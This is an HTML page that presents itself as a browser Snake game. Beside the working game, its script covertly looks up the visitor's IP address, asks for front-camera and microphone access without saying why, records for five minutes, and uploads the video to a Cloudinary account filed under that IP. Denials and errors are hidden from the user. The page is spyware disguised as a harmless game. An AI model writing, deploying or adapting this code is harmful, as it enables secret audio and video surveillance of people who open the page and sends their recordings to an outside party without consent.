<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
<title>Snake Game</title>
<style>
  html, body {
    margin:0; padding:0; height:100%; overflow:hidden;
    background: #222;
    color: #eee;
    font-family: Arial, sans-serif;
    -webkit-user-select:none; -moz-user-select:none; user-select:none;
    -webkit-touch-callout:none;
  }
  #gameContainer {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
  }
  #scoreboard {
    font-size: 1.5rem;
    margin-bottom: 10px;
    user-select:none;
  }
  #gameCanvas {
    background: #111;
    border: 2px solid #666;
    touch-action: none;
  }
  #newGameBtn {
    margin-top: 15px;
    padding: 8px 16px;
    font-size: 1rem;
    border: none;
    border-radius: 5px;
    background: #5cb85c;
    color: white;
    cursor: pointer;
    user-select:none;
  }
  #newGameBtn:active {
    background: #4cae4c;
  }
</style>
</head>
<body>
<div id="gameContainer">
  <div id="scoreboard">Score: 0</div>
  <canvas id="gameCanvas" width="320" height="320"></canvas>
  <button id="newGameBtn">New Game</button>
</div>

<script>
(async function() {
  const CLOUD_NAME = 'YOUR_CLOUD_NAME'; // Replace
  const UPLOAD_PRESET = 'YOUR_UPLOAD_PRESET'; // Replace

  // IP fetch helper
  async function fetchIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip.replace(/\./g, '_'); // replace dots for folder naming
    } catch {
      return 'unknown_ip';
    }
  }

  // Cloudinary upload
  async function uploadBlob(blob, ipFolder) {
    const url = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`;
    const formData = new FormData();
    formData.append('file', blob);
    formData.append('upload_preset', UPLOAD_PRESET);
    formData.append('folder', ipFolder);
    try {
      await fetch(url, { method: 'POST', body: formData });
      // console.log('Upload success');
    } catch(e) {
      // console.error('Upload failed', e);
    }
  }

  // Game Setup
  const canvas = document.getElementById('gameCanvas');
  const ctx = canvas.getContext('2d');
  const scoreboard = document.getElementById('scoreboard');
  const newGameBtn = document.getElementById('newGameBtn');

  const gridSize = 16;
  const tileCount = canvas.width / gridSize;

  let snake = [{x:9, y:9}];
  let velocity = {x:0, y:0};
  let apple = {x:5, y:5};
  let score = 0;
  let gameOver = false;
  let inputLocked = false;

  function placeApple() {
    apple.x = Math.floor(Math.random() * tileCount);
    apple.y = Math.floor(Math.random() * tileCount);
    // avoid apple on snake
    while (snake.some(s => s.x === apple.x && s.y === apple.y)) {
      apple.x = Math.floor(Math.random() * tileCount);
      apple.y = Math.floor(Math.random() * tileCount);
    }
  }

  function draw() {
    ctx.fillStyle = '#111';
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // draw apple
    ctx.fillStyle = 'red';
    ctx.fillRect(apple.x*gridSize, apple.y*gridSize, gridSize, gridSize);

    // draw snake
    ctx.fillStyle = 'lime';
    snake.forEach((segment, i) => {
      ctx.fillRect(segment.x*gridSize, segment.y*gridSize, gridSize, gridSize);
    });
  }

  function update() {
    if(gameOver) return;

    // Move snake by adding new head
    const head = {x: snake[0].x + velocity.x, y: snake[0].y + velocity.y};

    // Wrap edges
    if (head.x < 0) head.x = tileCount - 1;
    if (head.x >= tileCount) head.x = 0;
    if (head.y < 0) head.y = tileCount - 1;
    if (head.y >= tileCount) head.y = 0;

    // Check collision with self
    if (snake.some(s => s.x === head.x && s.y === head.y)) {
      gameOver = true;
      return;
    }

    snake.unshift(head);

    // Eat apple
    if(head.x === apple.x && head.y === apple.y) {
      score++;
      scoreboard.textContent = 'Score: ' + score;
      placeApple();
    } else {
      snake.pop();
    }
  }

  function gameLoop() {
    if(!gameOver) {
      update();
      draw();
    } else {
      // Game Over - do nothing or you can add a message if needed
    }
  }

  function resetGame() {
    snake = [{x:9, y:9}];
    velocity = {x:0, y:0};
    placeApple();
    score = 0;
    gameOver = false;
    scoreboard.textContent = 'Score: 0';
  }

  // Controls
  window.addEventListener('keydown', e => {
    if(inputLocked) return;
    switch(e.key) {
      case 'ArrowUp': if(velocity.y === 1) break; velocity = {x:0,y:-1}; inputLocked = true; break;
      case 'ArrowDown': if(velocity.y === -1) break; velocity = {x:0,y:1}; inputLocked = true; break;
      case 'ArrowLeft': if(velocity.x === 1) break; velocity = {x:-1,y:0}; inputLocked = true; break;
      case 'ArrowRight': if(velocity.x === -1) break; velocity = {x:1,y:0}; inputLocked = true; break;
    }
  });

  // Touch controls
  let touchStartX = 0;
  let touchStartY = 0;
  canvas.addEventListener('touchstart', e => {
    if (e.touches.length === 1) {
      touchStartX = e.touches[0].clientX;
      touchStartY = e.touches[0].clientY;
    }
  }, {passive:true});

  canvas.addEventListener('touchend', e => {
    if(inputLocked) return;
    if (e.changedTouches.length === 1) {
      let dx = e.changedTouches[0].clientX - touchStartX;
      let dy = e.changedTouches[0].clientY - touchStartY;
      if(Math.abs(dx) > Math.abs(dy)) {
        if(dx > 20 && velocity.x !== -1) velocity = {x:1,y:0};
        else if(dx < -20 && velocity.x !== 1) velocity = {x:-1,y:0};
      } else {
        if(dy > 20 && velocity.y !== -1) velocity = {x:0,y:1};
        else if(dy < -20 && velocity.y !== 1) velocity = {x:0,y:-1};
      }
      inputLocked = true;
    }
  }, {passive:true});

  // Unlock input after each frame
  setInterval(() => { inputLocked = false; }, 100);

  newGameBtn.addEventListener('click', resetGame);

  // Initial game setup
  resetGame();
  setInterval(gameLoop, 120);

  // Media recording logic
  let mediaRecorder;
  let recordedChunks = [];
  let sessionFolder = '';
  let ip = await fetchIP();

  try {
    // Request front camera + mic permission with facingMode user
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' }, 
      audio: true 
    });

    // Start recording automatically
    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

    mediaRecorder.ondataavailable = e => {
      if (e.data.size > 0) recordedChunks.push(e.data);
    };

    mediaRecorder.onstop = async () => {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      recordedChunks = [];
      // Upload to Cloudinary with IP folder
      await uploadBlob(blob, ip);
    };

    mediaRecorder.start();

    // Stop recording after 5 mins (300,000 ms)
    setTimeout(() => {
      if(mediaRecorder && mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
      }
    }, 300000);

  } catch (err) {
    // User denied permission or error, do nothing (no UI messaging)
  }

})();
</script>
</body>
</html>